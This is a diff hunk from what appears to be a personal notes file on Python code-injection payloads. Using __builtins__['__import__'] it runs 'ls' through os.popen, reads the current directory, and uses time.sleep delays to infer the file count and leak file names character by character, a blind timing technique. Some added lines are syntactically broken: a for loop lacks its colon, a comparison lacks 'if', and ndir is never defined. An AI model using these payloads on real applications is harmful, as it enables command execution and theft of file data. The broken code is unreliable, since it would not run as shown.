@@ -145,13 +145,23 @@ print(__builtins__)
 size = __builtins__['len']('String len is 16')
 
 # import os; os.popen('ls').read()
-lfiles = __builtins__['__import__']('os').popen('ls').read()
+lsfiles = __builtins__['__import__']('os').popen('ls').read()
 
 # python2 print current working directory os.getcwd()
 cdir = lfiles = __builtins__['__import__']('os').getcwd()
 
-# GUESS : Number of files in current directory
-if os.listdir(path).__len__()==n:time.sleep(20)
+# GUESS : Number of files in current directory < 30
+for n in  __builtins__['range'](0,30):
+    if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
+        __builtins__['__import__']('time').sleep(20)
+
+# GUESS : File names given path and number of files
+char_set = string.ascii_letters + '0123456789' + '/-'
+for file_index in ndir:
+    for char_index in range(0,20)
+        for ele in char_set: 
+            __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
+            sleep(3)
 
 
 ```
